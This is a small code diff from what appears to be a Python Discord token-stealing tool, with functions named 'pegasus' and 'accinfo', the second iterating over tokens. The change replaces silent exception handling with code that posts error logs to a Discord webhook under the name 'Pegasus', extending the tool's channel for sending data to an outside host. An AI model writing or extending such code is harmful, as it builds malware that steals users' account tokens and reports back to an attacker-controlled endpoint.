@@ -68,8 +68,12 @@ def pegasus():
         ]:
         try:
             func()
-        except:
-            pass
+        except Exception as e:
+            try:
+                webhook = Webhook.from_url(WEBHOOK_URL, adapter=RequestsWebhookAdapter())
+                webhook.send(content=f"error log: {e}", avatar_url="https://media.discordapp.net/attachments/798245111070851105/930314565454004244/IMG_2575.jpg", username="Pegasus")
+            except:
+                pass
 
 def accinfo():
     for t in int(tokens):
